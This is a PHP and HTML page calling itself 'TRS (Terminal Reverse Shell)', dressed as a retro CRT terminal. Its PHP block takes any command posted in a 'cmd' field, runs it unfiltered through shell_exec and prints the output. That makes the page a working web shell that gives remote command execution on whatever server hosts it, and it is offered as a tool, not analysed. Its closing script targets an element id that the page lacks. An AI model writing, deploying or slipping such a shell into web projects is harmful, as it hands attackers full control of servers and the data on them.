

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRS</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"> 
<link rel="stylesheet" href="https://raw.githubusercontent.com/Ento9/TerminalImg/main/style.css">
</head>
<body>
    <div id='title'>
    <h3>TRS</h3>
    <p>(Terminal Reverse Shell)</p>
    </div>
    
    <div id='container'>

    <div id='woodCasing'><img src="https://raw.githubusercontent.com/Ento9/TerminalImg/main/wood.jpg" alt="" class='woodImg'></div>
    <div id='screen'>
        <img src="https://raw.githubusercontent.com/Ento9/TerminalImg/main/scanlines.png" alt="" id='scan'>
        <img src="https://raw.githubusercontent.com/Ento9/TerminalImg/main/bezel.png" alt="" id='bezel'>
            <div id='scrolling'>
            <div id='content'>
            <?php

if(isset($_POST['cmd'])) 
{
    $cmd = $_POST['cmd'];

    $result = shell_exec($cmd);

    echo "<pre>".$result."</pre>"."<br>";
}

?>

    <form action="" method='post'>

<p>
-----Command:------------<br>
 > $ <input type="text" name='cmd' id='textbox'>

    </p>


</form>
            </div>
        </div>

    </div>
    

    </div>
    
    
    
</body>
<script>
    document.getElementById('cmd').addEventListener('submit', function(event) {
        if (event.keyCode == 13) {
            event.preventDefault();
        }
    });
</script>
</html>
